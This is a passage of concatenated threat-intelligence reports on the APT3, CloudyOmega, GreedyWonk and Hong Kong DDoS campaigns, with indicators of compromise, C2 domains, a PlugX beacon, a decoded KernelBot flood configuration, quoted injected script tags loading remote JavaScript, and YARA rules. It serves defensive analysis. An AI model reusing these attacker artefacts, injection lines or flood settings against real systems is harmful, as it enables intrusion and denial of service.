On October 28, we observed APT3 sending out spearphishing messages containing a compressed
executable attachment. The deflated exe was a variant of the same downloader described above and
connected to 198.55.115.71 over port 1913 via SOCKS5 proxy. The secondary payload in that case was
detected as Backdoor.APT.CookieCutter (aka Pirpi) and also named newnotepad.exe (MD5
8849538ef1c3471640230605c2623c67) and connected to the known APT3 domains:
  inform.bedircati[.]com
  pn.lamb-site[.]com
  210.109.99.64
The 192.184.60.229 IP address seen in this current campaign also hosts securitywap[.]com 
 another
known domain referenced in our Operation Clandestine Fox blog.
 DOMAIN                    FIRST SEEN     LAST SEEN        IP ADDRESS
 securitywap.com           2014-11-17     2014-11-20       192.184.60.229
 www.securitywap.com       2014-11-17     2014-11-20       192.184.60.229
In addition, the join.playboysplus[.]com exploit and payload delivery site resolves to 104.151.248.173.
This IP has hosted other domains used by APT3 in past campaigns:
 DOMAIN                     FIRST SEEN     LAST SEEN        IP ADDRESS
 join.playboysplus[.]com    2014-11-21     2014-11-21       104.151.248.173
 walterclean[.]com          2014-11-18     2014-11-20       104.151.248.173
 www.walterclean[.]com      2014-11-18     2014-11-20       104.151.248.173
As we discussed in our previous blog detailing previous APT3 activity, the walterclean[.]com served as a
Plugx/Kaba command and control server.
Conclusion
Although APT3 is well known for employing zero-day exploits in their attacks, recent activity has
demonstrated that they will also attack targets with known exploits or social engineering.
Since Operation Clandestine Fox, we have observed this actor execute multiple attacks that did not rely on
zero-day exploits. The combination of this sustained operational tempo and lack of zero-day
exploits may indicate that this group has changed strategy and has decided to attack more
frequently and does not have steady access to zero-day exploit code. No matter the strategy,
this actor has shown an ability to operate successfully.
IOCs for this threat can be found here.
Operation CloudyOmega: Ichitaro zero-day and ongoing
cyberespionage campaign targeting Japan
JustSystems has issued an update to its Ichitaro product line (Japanese office suite software), plugging a
zero-day vulnerability. This vulnerability is being actively exploited in the wild to specifically target
Japanese organizations.
The exploit is sent to the targeted organizations through emails with a malicious Ichitaro document file
attached, which Symantec products detect as Bloodhound.Exploit.557. Payloads from the exploit may
include Backdoor.Emdivi, Backdoor.Korplug, and Backdoor.ZXshell; however, all payloads aim to steal
confidential information from the compromised computer.
The content of the emails vary depending on the business interest of the targeted recipient
s organization;
however, all are about recent political events associated with Japan. Opening the malicious attachment
with Ichitaro will drop the payload and display the document. Often such exploitation attempts crash and
then relaunch the document viewer to open a clean document in order to trick users into believing it is
legitimate. In this particular attack, opening the document and dropping the payload are done without
crashing Ichitaro and, as such, users have no visual indications as to what is really happening in the
background.
CloudyOmega
As Security Response previously discussed, unpatched vulnerabilities being exploited is nothing new for
Ichitaro. However, during our investigation of this Ichitaro zero-day attack, we discovered that the attack
was in fact part of an ongoing cyberespionage campaign specifically targeting various Japanese
organizations. Symantec has named this attack campaign CloudyOmega. In this campaign, variants of
Backdoor.Emdivi are persistently used as a payload. All attacks arrive on the target computers as an
attachment to email messages. Mostly the attachments are in a simple executable format with a fake icon.
However, some of the files exploit software vulnerabilities, and the aforementioned vulnerability in
Ichitaro software is only one of them. This group
s primary goal is to steal confidential information from
targeted organizations. This blog provides insights into the history of the attack campaign, infection
methods, malware payload, and the group carrying out the attacks.
Timeline
The first attack of the campaign can be traced back to at least 2011. Figure 1 shows the targeted sectors
and the number of attacks carried out each year. The perpetrators were very cautious launching attacks in
the early years with attacks beginning in earnest in 2014. By far, the public sector in Japan is the most
targeted sector hit by Operation CloudyOmega. This provides some clue as to who the attack group is.
Figure 1. Targeted sectors and number of attacks
Attack vector
Email is the predominant infection vector used in this campaign.
Figure 2. Sample email used in attack campaign
Figure 2 is an example of an email used in recent attacks prior to those exploiting the Ichitaro zero-day
vulnerability. The emails include password-protected .zip files containing the malware. Ironically, the
attackers follow security best practices by indicating in the first email that the password will be sent to the
recipient in a separate email. This is merely to trick the recipient into believing the email is from a
legitimate and trustworthy source. The body of the email is very short and claims the attachment includes
a medical receipt. The email also requests that the recipient open the attachment on a Windows computer.
The file in the attachment has a Microsoft Word icon but, as indicated within Windows Explorer, it is an
executable file.
Figure 3. Attached 
document
 is actually a malicious executable file
Payload
The malicious payload is Backdoor.Emdivi, a threat that opens a back door on the compromised
computer. The malware is exclusively used in the CloudyOmega attack campaign and first appeared in
2011 when it was used in an attack against a Japanese chemical company. Emdivi allows the remote
attacker executing the commands to send the results back to the command-and-control (C&C) server
through HTTP.
Each Emdivi variant has a unique version number and belongs to one of two types: Type S and Type T.
The unique version number is not only a clear sign that Emdivi is systematically managed, but it also acts
as an encryption key. The malware adds extra words to the version number and then, based on this,
generates a hash, which it uses as an encryption key.
Both Emdivi Type S and Type T share the following functionality:
      Allow a remote attacker to execute code through HTTP
      Steal credentials stored by Internet Explorer
Type T is primarily used in Operation CloudyOmega, has been in constant development since the
campaign was first launched in 2011, and is written in the C++ programing language. Type T employs
techniques to protect itself from security vendors or network administrators. Important parts of Type T,
such as the C&C server address it contacts and its protection mechanisms, are encrypted. Type T also
detects the presence of automatic analysis systems or debuggers, such as the following:
      VirtualMachine
      Debugger
      Sandbox
Type S, on the other hand, was used only twice in the attack campaign. Type S is a .NET application based
on the same source code and shared C&C infrastructure as Type T. However, protection mechanisms and
encryption, essential features for threat survival, are not present in Type S. One interesting trait of Type S
is that it uses Japanese sentences that seem to be randomly taken from the internet to change the file
hash. For instance, in the example shown in Figure 4, it uses a sentence talking about the special theory of
relativity.
Figure 4. Japanese text used by Emdivi Type S variant
Who is Emdivi talking to?
Once infected, Emdivi connects to hardcoded C&C servers using the HTTP protocol.
So far, a total of 50 unique domains have been identified from 58 Emdivi variants. Almost all websites
used as C&C servers are compromised Japanese websites ranging from sites belonging to small businesses
to personal blogs. We discovered that 40 out of the 50 compromised websites, spread across 13 IP
addresses, are hosted on a single cloud-hosting service based in Japan.
Figure 5. Single IP hosts multiple compromised websites
The compromised sites are hosted on various pieces of web server software, such as Apache and Microsoft
Internet Information Services (IIS), and are on different website platforms. This indicates that the sites
were not compromised through a vulnerability in a single software product or website platform. Instead,
the attacker somehow penetrated the cloud service itself and turned the websites into C&C servers for
Backdoor.Emdivi.
The compromised cloud hosting company has been notified but, at the time of writing, has not replied.
Symantec offers two IPS signatures that detect and block network communication between infected
computers and the Emdivi C&C server:
      System Infected: Backdoor.Emdivi Activity
      System Infected: Backdoor.Emdivi Activity 2
Zero-day and links to other cybercriminal groups
During our research, multiple samples related to this attack campaign were identified and allowed us to
connect the dots, as it were, when it came to CloudyOmega's connections to other attack groups.
In August 2012, the CloudyOmega attackers exploited the zero-day Adobe Flash Player and AIR
'copyRawDataTo()' Integer Overflow Vulnerability (CVE-2012-5054) in an attack against a high-profile
organization in Japan. The attackers sent a Microsoft Word file containing a maliciously crafted SWF file
that exploited the vulnerability. Once successfully exploited, the file installed Backdoor.Emdivi. As CVE-
2012-5054 was publicly disclosed in the same month, the attack utilized what was, at the time, a zero-day
exploit.
Interestingly, the Flash file that was used in an Emdivi attack in 2012 and the one used in the LadyBoyle
attack in 2013 look very similar.
Figure 6 shows the malformed SWF file executing LadyBoyle() code that attempts to exploit the Adobe
Flash Player CVE-2013-0634 Remote Memory Corruption Vulnerability (CVE-2013-0634). The Flash file
seems to have been created using the same framework used by the CloudyOmega group, but with a
different exploit.
Figure 6. Malformed SWF file used in the LadyBoyle campaign in February 2013
Both attacks use a .doc file containing an Adobe Flash zero-day exploit that is used to install a back door.
No other evidence connects these two different campaigns; however, as described previously in Symantec
Security Response
s Elderwood blog, it is strongly believed that a single parent organization has broken
into a number of subgroups that each target a particular industry.
In terms of the latest attack on Ichitaro, we collected a dozen samples of JTD files, all of which are exactly
the same except for their payload. The parent organization, it would seem, supplied the zero-day exploit to
the different subgroups as part of an attack toolkit and each group launched a separate attack using their
chosen malware. This is why three different payloads (Backdoor.Emdivi, Backdoor.Korplug, and
Backdoor.ZXshell) were observed in the latest zero-day attack.
Figure 7. Parent group sharing zero-day exploit
Conclusion
Operation CloudyOmega was launched by an attack group that has communication channels with other
notorious attack groups including Hidden Lynx and the group responsible for LadyBoyle. CloudyOmega
has been in operation since 2011 and is persistent in targeting Japanese organizations. With the latest
attack employing a zero-day vulnerability, there is no indication that the group will stop their activities
anytime soon. Symantec Security Response will be keeping a close eye on the CloudyOmega group.
Protection summary
It is highly recommended that customers using Ichitaro products apply any patches as soon as possible.
Symantec offers the following protection against attacks associated with Operation CloudyOmega:
      Backdoor.Emdivi
      Backdoor.Emdivi!gen1
      Backdoor.Emdivi!gen2
      Bloodhound.Exploit.557
      Trojan.Mdropper
      System Infected: Backdoor.Emdivi Activity
      System Infected: Backdoor.Emdivi Activity 2
Operation GreedyWonk: Multiple Economic and Foreign Policy Sites
Compromised, Serving Up Flash Zero-Day Exploit
Less than a week after uncovering Operation SnowMan, the FireEye Dynamic Threat Intelligence cloud
has identified another targeted attack campaign 
 this one exploiting a zero-day vulnerability in Flash.
We are collaborating with Adobe security on this issue. Adobe has assigned the CVE identifier CVE-2014-
0502 to this vulnerability and released a security bulletin.
As of this blog post, visitors to at least three nonprofit institutions 
 two of which focus on matters of
national security and public policy 
 were redirected to an exploit server hosting the zero-day exploit.
re dubbing this attack 
Operation GreedyWonk.
We believe GreedyWonk may be related to a May 2012 campaign outlined by ShadowServer, based
on consistencies in tradecraft (particularly with the websites chosen for this strategic Web compromise),
attack infrastructure, and malware configuration properties.
The group behind this campaign appears to have sufficient resources (such as access to zero-day exploits)
and a determination to infect visitors to foreign and public policy websites. The threat actors likely sought
to infect users to these sites for follow-on data theft, including information related to defense and public
policy matters.
Discovery
On Feb. 13, FireEye identified a zero-day Adobe Flash exploit that affects the latest version of the Flash
Player (12.0.0.4 and 11.7.700.261). Visitors to the Peter G. Peterson Institute for International Economics
(www.piie[.]com) were redirected to an exploit server hosting this Flash zero-day through a hidden
iframe.
We subsequently found that the American Research Center in Egypt (www.arce[.]org) and the Smith
Richardson Foundation (www.srf[.]org) also redirected visitors the exploit server. All three organizations
are nonprofit institutions; the Peterson Institute and Smith Richardson Foundation engage in national
security and public policy issues.
Mitigation
To bypass Windows
 Address Space Layout Randomization (ASLR) protections, this exploit targets
computers with any of the following configurations:
      Windows XP
      Windows 7 and Java 1.6
      Windows 7 and an out-of-date version of Microsoft Office 2007 or 2010
Users can mitigate the threat by upgrading from Windows XP and updating Java and Office. If you
have Java 1.6, update Java to the latest 1.7 version. If you are using an out-of-date Microsoft Office 2007
or 2010, update Microsoft Office to the latest version.
These mitigations do not patch the underlying vulnerability. But by breaking the exploit
s ASLR-bypass
measures, they do prevent the current in-the-wild exploit from functioning.
Vulnerability analysis
GreedyWonk targets a previously unknown vulnerability in Adobe Flash. The vulnerability permits an
attacker to overwrite the vftable pointer of a Flash object to redirect code execution.
ASLR bypass
The attack uses only known ASLR bypasses. Details of these techniques are available from our previous
blog post on the subject (in the 
Non-ASLR modules
 section).
For Windows XP, the attackers build a return-oriented programming (ROP) chain of MSVCRT (Visual C
runtime) gadgets with hard-coded base addresses for English (
) and Chinese (
zh-cn
 and 
zh-tw
On Windows 7, the attackers use a hard-coded ROP chain for MSVCR71.dll (Visual C++ runtime) if the
user has Java 1.6, and a hard-coded ROP chain for HXDS.dll (Help Data Services Module) if the user has
Microsoft Office 2007 or 2010.
Java 1.6 is no longer supported and does not receive security updates. In addition to the MSVCR71.dll
ASLR bypass, a variety of widely exploited code-execution vulnerabilities exist in Java 1.6. That
s why
FireEye strongly recommends upgrading to Java 1.7.
The Microsoft Office HXDS.dll ASLR bypass was patched at the end of 2013. More details about this
bypass are addressed by Microsoft
s Security Bulletin MS13-106 and an accompanying blog entry.
FireEye strongly recommends updating Microsoft Office 2007 and 2010 with the latest patches.
Shellcode analysis
The shellcode is downloaded in ActionScript as a GIF image. Once ROP marks the shellcode as executable
using Windows
 VirtualProtect function, it downloads an executable via the InternetOpenURLA and
InternetReadFile functions. Then it writes the file to disk with CreateFileA and WriteFile functions.
Finally, it runs the file using the WinExec function.
PlugX/Kaba payload analysis
Once the exploit succeeds, a PlugX/Kaba remote access tool (RAT) payload with the MD5 hash
507aed81e3106da8c50efb3a045c5e2b is installed on the compromised endpoint. This PlugX sample was
compiled on Feb. 12, one day before we first observed it, indicating that it was deployed specifically for
this campaign.
This PlugX payload was configured with the following command-and-control (CnC) domains:
      java.ns1[.]name
      adservice.no-ip[.]org
      wmi.ns01[.]us
Sample callback traffic was as follows:
    POST /D28419029043311C6F8BF9F5 HTTP/1.1
    Accept: */*
    HHV1: 0
    HHV2: 0
    HHV3: 61456
    HHV4: 1
    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;
    InfoPath.2; .NET CLR 2.0.50727; SV1)
    Host: java.ns1.name
    Content-Length: 0
    Connection: Keep-Alive
    Cache-Control: no-cache
Campaign analysis
Both java.ns1[.]name and adservice.no-ip[.]org resolved to 74.126.177.68 on Feb. 18, 2014. Passive DNS
analysis reveals that the domain wmi.ns01.us previously resolved to 103.246.246.103 between July 4,
2013 and July 15, 2013 and 192.74.246.219 on Feb. 17, 2014. java.ns1[.]name also resolved to
192.74.246.219 on February 18.
Domain                  First Seen    Last Seen        IP Address
adservice.no-ip[.]org   2014-02-18    2014-02-19       74.126.177.68
java.ns1[.]name         2014-02-18    2014-02-19       74.126.177.68
java.ns1[.]name         2014-02-18    2014-02-18       192.74.246.219
wmi.ns01[.]us           2014-02-17    2014-02-17       192.74.246.219
proxy.ddns[.]info       2013-05-02    2014-02-18       103.246.246.103
updatedns.ns02[.]us 2013-09-06       2013-09-06      103.246.246.103
updatedns.ns01[.]us 2013-09-06       2013-09-06      103.246.246.103
wmi.ns01[.]us       2013-07-04       2013-07-15      103.246.246.103
Further research uncovered a number of older malware samples connecting to the same domain
wmi.ns01[.]us.
MD5                               Family Compile Alternate C2s
                                           Time
7995a9a6a889b914e208eb924e459ebc PlugX     2012-06-09 fuckchina.govnb[.]com
bf60b8d26bc0c94dda2e3471de6ec977 PlugX     2010-03-15 microsafes.no-ip[.]org
fd69793bd63c44bbb22f9c4d46873252 Poison 2013-03-07 N/A
                                  Ivy
88b375e3b5c50a3e6c881bc96c926928 Poison 2012-06-11 N/A
                                  Ivy
cd07a9e49b1f909e1bd9e39a7a6e56b4 Poison 2012-06-11 N/A
                                  Ivy
Domain                 First Seen   Last Seen       IP Address
fuckchina.govnb[.]com 2013-12-11    2013-12-11      204.200.222.136
microsafes.no-ip[.]org 2014-02-12   2014-02-12      74.126.177.70
microsafes.no-ip[.]org 2013-12-04   2013-12-04      74.126.177.241
The Poison Ivy variants that connected to the domain wmi.ns01[.]us had the following unique
configuration properties:
MD5                              Password                   Mutex
fd69793bd63c44bbb22f9c4d46873252 java7                      NBCD*&^FE
88b375e3b5c50a3e6c881bc96c926928 admin                      ytf^&^333
cd07a9e49b1f909e1bd9e39a7a6e56b4 admin                      ytf^&^333
We found a related Poison Ivy sample (MD5 8936c87a08ffa56d19fdb87588e35952) with the same 
java7
password, which was dropped by an Adobe Flash exploit (CVE-2012-0779). In this previous incident,
visitors to the Center for Defense Information website (www.cdi[.]org 
 also an organization involved in
defense matters 
 were redirected to an exploit server at 159.54.62.92.
This exploit server hosted a Flash exploit file named BrightBalls.swf (MD5
1ec5141051776ec9092db92050192758). This exploit, in turn, dropped the Poison Ivy variant. In addition
to using the same password 
java7,
 this variant was configured with the mutex with the similar pattern of
YFds*&^ff
 and connected to a CnC server at windows.ddns[.]us.
Using passive DNS analysis, we see the domains windows.ddns[.]us and wmi.ns01[.]us both resolved to
76.73.80.188 in mid-2012.
Domain              First Seen       Last Seen       IP Address
wmi.ns01.us         2012-07-07       2012-09-19      76.73.80.188
windows.ddns.us     2012-05-23       2012-06-10      76.73.80.188
During another earlier compromise of the same www.cdi.org website, visitors were redirected to a Java
exploit test.jar (MD5 7d810e3564c4eb95bcb3d11ce191208e). This jar file exploited CVE-2012-0507 and
dropped a Poison Ivy payload with the hash (MD5 52aa791a524b61b129344f10b4712f52). This Poison Ivy
variant connected to a CnC server at ids.ns01[.]us. The domain ids.ns01[.]us also overlaps with the
domain wmi.ns01[.]us on the IP 194.183.224.75.
Domain              First Seen       Last Seen         IP Address
wmi.ns01[.]us       2012-07-03       2012-07-04        194.183.224.75
ids.ns01[.]us       2012-04-23       2012-05-18        194.183.224.75
The Poison Ivy sample referenced above (MD5 fd69793bd63c44bbb22f9c4d46873252) was delivered via
an exploit chain that began with a redirect from the Center for European Policy Studies (www.ceps[.]be).
In this case, visitors were redirected from www.ceps[.]be to a Java exploit hosted on shop.fujifilm[.]be.
In what is certainly not a coincidence, we also observed www.arce[.]org (one of the sites redirecting to the
current Flash exploit) also redirect visitors to the Java exploit on shop.fujifilm[.]be in 2013.
Conclusion
This threat actor clearly seeks out and compromises websites of organizations related to international
security policy, defense topics, and other non-profit sociocultural issues. The actor either maintains
persistence on these sites for extended periods of time or is able to re-compromise them periodically.
This actor also has early access to a number of zero-day exploits, including Flash and Java, and deploys a
variety of malware families on compromised systems. Based on these and other observations, we conclude
that this actor has the tradecraft abilities and resources to remain a credible threat in at least the mid-
term.
Operation Poisoned Handover: Unveiling Ties Between APT Activity
in Hong Kong
s Pro-Democracy Movement
As the pro-democracy movement in Hong Kong has continued, we
ve been watching for indications of
confrontation taking place in cyberspace. Protests began in September and have continued to escalate.
In recent weeks, attackers have launched a series of Distributed Denial of Service attacks (DDoS) against
websites promoting democracy in Hong Kong. According to the Wall Street Journal, websites belonging to
Next Media
s Apple Daily publication have suffered from an ongoing DDoS attack that 
brought down its
email system for hours
. According to other reports, Next Media
s network has suffered a 
total failure
a result of these attacks. Additionally, at least one member of the popular online forum HKGolden was
arrested for posting messages encouraging support for the OccupyCentral Pro Democracy movement.
The use of DDoS attacks as a political tool during times of conflict is not new; patriotic hacktivist groups
frequently use them as a means to stifle political activity of which they disapprove. The question of state
sponsorship (or at least tacit approval) in online crackdowns is often up for debate and ambiguous from a
technical evidence and tradecraft perspective.
In this case, however, we
ve discovered an overlap in the tools and infrastructure used by China-based
advanced persistent threat (APT) actors and the DDoS attack activity. We believe that these DDoS attacks
are linked to previously observed APT activity, including Operation Poisoned Hurricane. This correlation
sheds light on the potential relationships, symbiosis and tool sharing between patriotic hacker activities
designed to disrupt anti-government activists in China, and the APT activity we consistently see that is
more IP theft and espionage-focused.
Ongoing DDoS Attacks Target the Pro-Democracy Movement
FireEye has identified a number of binaries coded to receive instructions from a set of command and
control (C2) servers instructing participating bots to attack Next Media-owned websites and the
HKGolden forum. Next Media is a large media company in Hong Kong and the HkGolden forum has been
used as a platform to organize pro-democracy protests. Each sample we identified is signed with digital
certificates that have also been used by APT actors to sign binaries in previous intrusion operations:
These binaries are W32 Cabinet self-extracting files that drop a variant of an older DDoS tool known as
KernelBot . All of the samples we identified have the 
NewVersion
 value of 20140926. Structurally, all of
these samples are similar in that they drop three files:
          ctfmon.exe-a legitimate, signed copy of the Pidgin IM client
           (md5 hash = 1685f978149d7ba8e039af9a4d5803c7)
          libssp-0.dll
malware DLL which is side-loaded by ctfmon.exe
           to decode and launch KernelBot. Most versions of this dll are also
           signed by either the QTI or CallTogether certificate.
          readme.txt 
 a binary file which contains the XOR-encoded
           KernelBot DLL as well as C2 destination information (most have
           md5 hash of b5ac964a74091d54e091e68cecd5b532)
The KernelBot implants receive targeting instructions from C2 servers hard-coded directly into the
sample. For example, c3d6450075d618b1edba17ee723eb3ca drops a KernelBot variant that connects to
both www.sapporo-digital-photoclub[.]com and wakayamasatei[.]com. The full list of C2 servers we
identified is as follows:
sapporo-digital-photoclub[.]com
wakayamasatei[.]com
tommo[.]jp
mizma.co[.]jp
sp.you-maga[.]com
nitori-tour[.]com
ninekobe[.]com
shinzenho[.]jp
wizapply[.]com
www.credo-biz[.]com
On Oct. 21, the control server at wakayamasatei[.]com responded with the following encoded
configuration file:
@$@cWFPWERPRnlPXl5DRE13JyBjWXhPWkVYXnleS15PFxonIGNZbkVdRGxDRk
94X0QaFxonIGlHTmNuGhcbJyBuRV1EbENGT3hfRH9YRhoXQl5eWhAFBRsaBBo
EGwQbHxsFGwRPUk8nIHF/Wk5LXk95T1hcT1h3JyBkT118T1hZQ0VEFxgaGx4
aExgcJyB/Wk5LXk9sQ0ZPf1hGF0JeXloQBQUbGgQaBBsEGx8bBRsET1JPJyBx
bm5leXViRVleeV5LXkNZXkNJWXcnIGlFX0Ref1hGFycgfkNHT1gXGCcgcW5uZ
Xl1eUlYQ1pebEZFRU53JyBjWXlJWENaXmxGRUVOFxsnIGlHTmNuFxsYGScgeU
lYQ1pebEZFRU5uZHkXJyB5SVhDWl5sRkVFTn9YRhdCXl5aEAUFRFJLWkMES1p
aRk9OS0NGUwRJRUcEQkEFJyB5SVhDWl5sRkVFTnpFWF4XEhonIGNZbU9ef1hG
bENGTxcbJyBjWXlPRE56S0lBT14XGicgfkJYT0tOZkVFWn5DR08XHycgfkJYT
0tOaUVfRF4XGxonIH5DR09YFxkcGicgY1l+Q0dPWBcbJyBxbm5leXV5SVhDWl
5sRkVFTnVrG3cnIGNZeUlYQ1pebEZFRU4XGicgaUdOY24XGycgeUlYQ1pebEZ
FRU5uZHkXGxoEGgQbBBsfGycgeUlYQ1pebEZFRU5/WEYXGxoEGgQbBBsfGwUb
BEJeR0YnIHlJWENaXmxGRUVOekVYXhcSGicgY1ltT15/WEZsQ0ZPFxsnIGNZe
U9ETnpLSUFPXhcbJyB+QlhPS05mRUVafkNHTxcbJyB+QlhPS05pRV9EXhcbJy
B+Q0dPWBcYGicgY1l+Q0dPWBcbJyBxbm5leXV/TlpsRkVFTncnIGNZf05abEZ
FRU4XGicgaUdOY24XGycgf05abEZFRU5uZHkXGxoEGgQbBBsfGycgfkJYT0tO
aUVfRF4XGycgfkNHT1gXGBonIGNZfkNHT1gXGycgcW5uZXl1f05abEZFRU51a
xt3JyBjWX9OWmxGRUVOFxonIGlHTmNuFxsnIH9OWmxGRUVObmR5FxsaBBoEGw
QbHxsnIH5CWE9LTmlFX0ReFxsnIH5DR09YFxgaJyBjWX5DR09YFxsnIHFubmV
5dXlTRGxGRUVOdycgY1l5U0RsRkVFThcaJyBpR05jbhcbJyB5U0RsRkVFTm5k
eRcbGgQaBBsEGx8bJyB5U0RsRkVFTnpFWF4XEhonIH5CWE9LTmlFX0ReFxsnI
H5DR09YFxgaJyBjWX5DR09YFxsnIHFubmV5dX5JWmxGRUVOdycgY1l+SVpsRk
VFThcaJyBpR05jbhcbJyB+SVpsRkVFTm5keRcbGgQaBBsEGx8bJyB+SVpsRkV
FTnpFWF4XEhonIGNZeU9ETnpLSUFPXhcbJyB+QlhPS05pRV9EXhcbJyB+Q0dP
WBcYGicgY1l+Q0dPWBcbJyBxbm5leXV+SVpsRkVFTnVrG3cnIGNZfklabEZFR
U4XGicgaUdOY24XGycgfklabEZFRU5uZHkXGxoEGgQbBBsfGycgfklabEZFRU
56RVheFxIaJyBjWXlPRE56S0lBT14XGycgfkJYT0tOaUVfRF4XHCcgfkNHT1g
XGBonIGNZfkNHT1gXGycg@$@
This configuration file can be decoded by stripping the leading and trailing @$@ characters. At this point,
a simple base64 and XOR decode will reveal the plaintext configuration. The following snippet of python
code can be used to decode this command:
b64encoded = request.content.rstrip('@$@').lstrip('@$@')
b64decoded = b64encoded.decode("base64")
command = ""
for c in b64decoded:
           x = ord(c)
           x = x ^ XOR_key
           command += chr(x)
FireEye has observed two different single-byte XOR keys used to encode configuration files issued by the
DDOS C2 servers in this campaign. The two different keys are 0x2A or 0x7E. The encoded configuration
file shown above decodes to:
[KernelSetting]
IsReportState=0
IsDownFileRun0=0
CmdID0=1
DownFileRunUrl0=http://10.0.1.151/1.exe
[UpdateServer]
NewVersion=20140926
UpdateFileUrl=http://10.0.1.151/1.exe
[DDOS_HostStatistics]
CountUrl=
Timer=2
[DDOS_ScriptFlood]
IsScriptFlood=1
CmdID=123
ScriptFloodDNS=
ScriptFloodUrl=http://nxapi.appledaily.com.hk/
ScriptFloodPort=80
IsGetUrlFile=1
IsSendPacket=0
ThreadLoopTime=5
ThreadCount=10
Timer=360
IsTimer=1
[DDOS_ScriptFlood_A1]
IsScriptFlood=0
CmdID=1
ScriptFloodDNS=10.0.1.151
ScriptFloodUrl=10.0.1.151/1.html
ScriptFloodPort=80
IsGetUrlFile=1
IsSendPacket=1
ThreadLoopTime=1
ThreadCount=1
Timer=20
IsTimer=1
[DDOS_UdpFlood]
IsUdpFlood=0
CmdID=1
UdpFloodDNS=10.0.1.151
ThreadCount=1
Timer=20
IsTimer=1
[DDOS_UdpFlood_A1]
IsUdpFlood=0
CmdID=1
UdpFloodDNS=10.0.1.151
ThreadCount=1
Timer=20
IsTimer=1
[DDOS_SynFlood]
IsSynFlood=0
CmdID=1
SynFloodDNS=10.0.1.151
SynFloodPort=80
ThreadCount=1
Timer=20
IsTimer=1
[DDOS_TcpFlood]
IsTcpFlood=0
CmdID=1
TcpFloodDNS=10.0.1.151
TcpFloodPort=80
IsSendPacket=1
ThreadCount=1
Timer=20
IsTimer=1
[DDOS_TcpFlood_A1]
IsTcpFlood=0
CmdID=1
TcpFloodDNS=10.0.1.151
TcpFloodPort=80
IsSendPacket=1
ThreadCount=6
Timer=20
IsTimer=1
During the course of our research, we
ve observed more than 30 different unique configuration files issued
by the C2 servers listed above. These configurations issued commands to attack the following domains and
IPs:
nxapi.appledaily.com[.]hk
202.85.162.90
58.64.139.10
202.85.162.97
202.85.162.81
198.41.222.6
202.85.162.101
202.85.162.95
202.85.162.180
202.85.162.140
202.85.162.130
124.217.214.149
All of the above IPs host Next Media or Apple daily websites, with the exception of 58.64.139.10 and
124.217.214.149. The IP 58.64.139.10 has hosted hkgolden[.]com 
 the domain for the HKGolden forum
mentioned above.
For approximately 14 hours between October 23rd and 24th, the attackers pushed a configuration update
to four controls servers that instructed bots under their control to flood 124.217.214.149 with UDP traffic.
The IP 124.217.214.149 hosted the attacker controlled domain p.java-sec[.]com.
On Oct. 23, 2014, two of the active controls began instructing participating bots to cease attacks. By Oct.
24, 2014, all five of the known active control servers were issuing commands to cease the attacks.
It should come as no surprise that hkgolden[.]com, nextmedia[.]com, and appledaily.com[.]hk websites
are now or previously have been blocked by the Great Firewall of China 
 indicating that the PRC has
found the content hosted on these sites objectionable.
Links to Previous Activity
The most direct connection between these DDoS attacks and previous APT activity is the use of the QTI
International and CallTogether code signing certificates, which we have seen in malware attributed to APT
activity.
The QTI International digital certificate has been previously used to sign binaries used in APT activity
including Operation Poisoned Hurricane. Specifically, 17bc9d2a640da75db6cbb66e5898feb1 is a PlugX
variant signed by the QTI International certificate. This PlugX variant connected to a Google Code project
at code.google[.]com/p/udom/, where it decoded a command that configured its C2 server.
The sample 0b54ae49fd5a841970b98a078968cb6b was signed with the QTI International certificate as
well. This sample was first observed during a drive-by attack in June 2014, and was downloaded from
java-se[.]com/jp.jpg. This sample is detected as Backdoor.APT.Preshin and connected to luxscena[.]com
for C2.
The QTI International certificate was also used to sign e2a4b96cce9de4fb126cfd5f5c73c3ed. We detect
this payload as Backdoor.APT.PISCES and it used hk.java-se[.]com for C2. The java-se[.]com website was
previously used in other attacks targeting the pro-democracy movement in Hong Kong. We first observed
the presence of malicious javascript inserted into Hong Kong Association for Democracy and People
Livelihood on June 26, 2014, which appeared as the following:
<a href="http://www.adpl.org.hk/?p=2680" title="
<script language=javascript src=http://java-se.com/o.js></script>">
More recently, as noted by Claudio Guarnieri, the website of the Democratic Party of Hong Kong was
seen hosting a redirect to the same malicious javascript.
The CallTogether certificate has been used to sign ecf21054ab515946a812d1aa5c408ca5. We also detect
this payload as Backdoor.APT.PISCES and observed it connect to u.java-se[.]com.
Both of these certificates are valid but can be detected and blocked via the following Yara signatures:
rule callTogether_certificate
    meta:
      author = "Fireeye Labs"
      version = "1.0"
      reference_hash = "d08e038d318b94764d199d7a85047637"
      description = 
detects binaries signed with the CallTogether certificate
    strings:
      $serial = {452156C3B3FB0176365BDB5B7715BC4C}
      $o = "CallTogether, Inc."
    condition:
      $serial and $o
rule qti_certificate
      meta:
           author = "Fireeye Labs"
           reference_hash = "cfa3e3471430a0096a4e7ea2e3da6195"
           description = "detects binaries signed with the QTI International Inc
certificate"
      strings:
           $cn = "QTI International Inc"
           $serial = { 2e df b9 fd cf a0 0c cb 5a b0 09 ee 3a db 97 b9 }
      condition:
           $cn and $serial
These ongoing DDoS attacks and previous APT intrusion activity both target the hkgolden[.]com website.
As noted above, this site has been targeted with a DDoS attack by a KernelBot network. We also found that
the hkgolden[.]com website was compromised on Sept. 5, 2014 and had a redirect to a malicious javascript
again hosted at another jave-se[.]com host, which appeared as follows:
document.write("<script language=javascript src=http://jre76.java-
se.com/js/rss.js></script>
Finally, as noted above the IP 124.217.214.149 was seen hosting the domain p.java-sec[.]com between Oct.
25, 2014 and Oct. 27, 2014. As Brandon Dixon noted here, the java-sec[.]com domain is linked to the java-
se[.]com by shared hosting history at the following IP address:
124.248.237.26
223.29.248.9
211.233.89.182
112.175.143.2
112.175.143.9
It is unclear why these actors would attack an IP address they were actively using. It
s possible that the
attackers wanted to test their botnet
s capability by attacking an IP they were using to gather statistics on
the size of the attack. It is also possible that the attackers simply made a mistake and accidentally issued
commands to attack their own infrastructure. On Oct. 24, 2014, after attacking their own infrastructure,
the attackers issued new instructions to their botnet that ceased all attacks.
Conclusion
While not conclusive, the evidence presented above shows a link between confirmed APT
activity and ongoing DDoS attacks that appear to be designed to silence the Pro Democracy
movement in Hong Kong. The evidence does not conclusively prove that the same actors responsible
for the DDoS attacks are also behind the observed intrusion activity discussed above 
 such as Operation
Poisoned Hurricane. Rather, the evidence may indicate that a common quartermaster supports
both the DDoS attacks and ongoing intrusion activity.
In either scenario, there is a clear connection between the intrusion activity documented in Operation
Poisoned Hurricane and the DDOS attacks documented here. While the tactics of these activities are very
